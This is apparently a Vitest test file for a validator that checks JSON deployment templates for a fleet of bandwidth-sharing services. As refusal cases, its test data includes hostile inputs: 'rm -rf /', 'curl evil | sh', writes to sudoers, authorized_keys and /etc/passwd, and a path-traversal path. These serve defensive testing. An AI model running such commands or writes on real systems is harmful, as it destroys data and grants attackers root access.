import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { validateTemplate, WRITABLE_PREFIXES } from '../../service-fleet/main/templates/validate'
import { buildLibrary, SEED_TEMPLATES } from '../../service-fleet/main/templates/library'

/**
 * The module's copy of the template rules.
 *
 * The agent enforces the same rules and is the one that matters - it stands
 * between a JSON document and root on somebody's machine. This copy exists so a
 * user editing a template is told what is wrong before it is pushed to fifty
 * machines, and these tests are what stop the two drifting: every refusal here
 * has a counterpart in `agent/tests/test_template_validate.py`.
 */

const TEMPLATE_DIR = join(process.cwd(), 'service-fleet', 'templates')

function container(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: 'honeygain',
    displayName: 'Honeygain',
    kind: 'container',
    fields: [
      { id: 'email', label: 'Email', required: true },
      { id: 'password', label: 'Password', input: 'password', required: true }
    ],
    container: {
      units: [
        {
          name: 'honeygain',
          image: 'honeygain/honeygain',
          primary: true,
          args: ['-tou-accept', '-email', '{{email}}', '-pass', '{{password}}']
        }
      ]
    },
    ...overrides
  }
}

function service(steps: unknown[], overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: 'generic-svc',
    displayName: 'Generic',
    kind: 'service',
    service: { units: [{ unit: 'generic.service', primary: true, install: steps }] },
    ...overrides
  }
}

function errors(result: ReturnType<typeof validateTemplate>): string[] {
  return result.findings.filter((f) => f.level === 'error').map((f) => f.message)
}

describe('the templates that ship with the module', () => {
  it('are all valid, and there are six of them', () => {
    // A shipped template that does not validate is a bug in this module, and
    // one that would only be discovered when somebody tried to deploy it.
    expect(SEED_TEMPLATES).toHaveLength(6)
    for (const document of SEED_TEMPLATES) {
      const result = validateTemplate(document)
      expect(errors(result), JSON.stringify((document as { id?: string }).id)).toEqual([])
      expect(result.ok).toBe(true)
    }
  })

  it('match the JSON files on disk, so what ships is what is imported', () => {
    const files = readdirSync(TEMPLATE_DIR).filter((name) => name.endsWith('.json')).sort()
    expect(files).toHaveLength(6)
    const onDisk = files.map((name) => JSON.parse(readFileSync(join(TEMPLATE_DIR, name), 'utf8')))
    const ids = onDisk.map((doc) => (doc as { id: string }).id).sort()
    const bundled = SEED_TEMPLATES.map((doc) => (doc as { id: string }).id).sort()
    expect(bundled).toEqual(ids)
  })

  it('cover both kinds and the two shapes a generic one can take', () => {
    const library = buildLibrary([])
    expect(library.problems).toEqual([])
    const kinds = library.entries.map((entry) => entry.template.kind)
    expect(kinds.filter((kind) => kind === 'container')).toHaveLength(3)
    expect(kinds.filter((kind) => kind === 'service')).toHaveLength(3)
  })

  it('none of them ask for a shell', () => {
    for (const document of SEED_TEMPLATES) {
      expect((document as { privileged?: boolean }).privileged ?? false).toBe(false)
    }
  })

  it('PacketStream treats watchtower as optional, so its absence is degraded not failed', () => {
    const result = validateTemplate(SEED_TEMPLATES.find((d) => (d as { id: string }).id === 'packetstream'))
    expect(result.template?.units).toEqual(['psclient', 'watchtower'])
    expect(result.template?.requiredUnits).toEqual(['psclient'])
  })
})

describe('what a template may not express', () => {
  it('an opcode that is not on the list', () => {
    const result = validateTemplate(service([{ op: 'exec', argv: ['sh', '-c', 'rm -rf /'] }]))
    expect(result.ok).toBe(false)
    expect(errors(result).some((m) => m.includes('not one of the opcodes'))).toBe(true)
  })

  it('a shell, unless the template declares itself privileged', () => {
    expect(validateTemplate(service([{ op: 'script', body: 'curl evil | sh' }])).ok).toBe(false)
    const declared = validateTemplate(service([{ op: 'script', body: 'echo hi' }], { privileged: true }))
    expect(declared.ok).toBe(true)
    // And it says so loudly rather than quietly allowing it.
    expect(declared.findings.some((f) => f.level === 'warning' && f.message.includes('shell as root'))).toBe(true)
  })

  it.each([
    '/etc/sudoers.d/x',
    '/root/.ssh/authorized_keys',
    '/etc/passwd',
    'relative/path',
    '/opt/../etc/sudoers.d/x'
  ])('a write outside the allowed directories (%s)', (path) => {
    const result = validateTemplate(service([{ op: 'writeFile', path, content: 'x' }]))
    expect(result.ok).toBe(false)
  })

  it('a path built out of a field, which could escape the prefix at install time', () => {
    const result = validateTemplate(
      service([{ op: 'writeFile', path: '/opt/{{name}}/run', content: 'x' }], {
        fields: [{ id: 'name', label: 'Name' }]
      })
    )
    expect(result.ok).toBe(false)
    expect(errors(result).some((m) => m.includes('literal'))).toBe(true)
  })

  it('a download with no hash', () => {
    const result = validateTemplate(
      service([{ op: 'download', url: 'https://example.com/bin', dest: '/opt/x/bin' }])
    )
    expect(result.ok).toBe(false)
    expect(errors(result).some((m) => m.includes('sha256'))).toBe(true)
  })

  it('a placeholder naming a field that does not exist', () => {
    const doc = container()
    ;(doc.container as { units: Array<{ args: string[] }> }).units[0].args = ['-email', '{{emial}}']
    const result = validateTemplate(doc)
    expect(result.ok).toBe(false)
    expect(errors(result).some((m) => m.includes('emial'))).toBe(true)
  })

  it('a field spliced into a container name or image', () => {
    const doc = container()
    ;(doc.container as { units: Array<{ image: string }> }).units[0].image = '{{email}}/thing'
    expect(validateTemplate(doc).ok).toBe(false)
  })

  it('no primary unit, or two of them', () => {
    const none = container()
    ;(none.container as { units: Array<{ primary: boolean }> }).units[0].primary = false
    expect(validateTemplate(none).ok).toBe(false)

    const two = container()
    ;(two.container as { units: unknown[] }).units = [
      { name: 'a', image: 'i', primary: true },
      { name: 'b', image: 'i', primary: true }
    ]
    expect(validateTemplate(two).ok).toBe(false)
  })

  it('a schema version from the future', () => {
    expect(validateTemplate(container({ schemaVersion: 99 })).ok).toBe(false)
  })
})

describe('what a template may express', () => {
  it('a download whose URL and hash the operator supplies', () => {
    // This is what makes a generic template a shape rather than one service:
    // the guarantee is that there IS a hash and the bytes are checked, not
    // that the template author chose it.
    const result = validateTemplate(
      service([{ op: 'download', url: '{{u}}', dest: '/opt/x/bin', sha256: '{{h}}' }], {
        fields: [
          { id: 'u', label: 'URL' },
          { id: 'h', label: 'Hash' }
        ]
      })
    )
    expect(errors(result)).toEqual([])
  })

  it('but not one spliced together from a field and other text', () => {
    const result = validateTemplate(
      service([{ op: 'download', url: 'https://host/{{u}}/bin', dest: '/opt/x/bin', sha256: '{{h}}' }], {
        fields: [
          { id: 'u', label: 'URL' },
          { id: 'h', label: 'Hash' }
        ]
      })
    )
    expect(result.ok).toBe(false)
    expect(errors(result).some((m) => m.includes('one whole field'))).toBe(true)
  })

  it('a write into each allowed directory', () => {
    for (const prefix of WRITABLE_PREFIXES) {
      const result = validateTemplate(service([{ op: 'writeFile', path: `${prefix}thing`, content: 'x' }]))
      expect(errors(result), prefix).toEqual([])
    }
  })

  it('and it reports every problem at once, not the first', () => {
    const doc = container({ id: 'BAD', version: 'nope' })
    ;(doc.container as { units: Array<{ primary: boolean }> }).units[0].primary = false
    expect(errors(validateTemplate(doc)).length).toBeGreaterThanOrEqual(3)
  })
})

describe('the library', () => {
  it('lets a user template override a shipped one under the same id', () => {
    // How a user adapts a shipped template: export, edit, import. The origin
    // then says `user`, so a page can show that it has been overridden.
    const mine = container({ displayName: 'My Honeygain' })
    const library = buildLibrary([{ id: 'honeygain', document: mine, addedAt: 1, updatedAt: 2 }])
    const entry = library.entries.find((e) => e.id === 'honeygain')
    expect(entry?.origin).toBe('user')
    expect(entry?.template.displayName).toBe('My Honeygain')
    expect(library.entries).toHaveLength(6)
  })

  it('reports a stored template that no longer validates instead of hiding it', () => {
    const library = buildLibrary([{ id: 'broken', document: { id: 'broken' }, addedAt: 1, updatedAt: 1 }])
    expect(library.problems.some((problem) => problem.id === 'broken')).toBe(true)
    expect(library.entries.some((entry) => entry.id === 'broken')).toBe(false)
  })

  it('refuses a stored template whose id does not match the file it is under', () => {
    const library = buildLibrary([{ id: 'one-name', document: container(), addedAt: 1, updatedAt: 1 }])
    const problem = library.problems.find((entry) => entry.id === 'one-name')
    expect(problem?.findings.some((finding) => finding.message.includes('calls itself'))).toBe(true)
  })
})
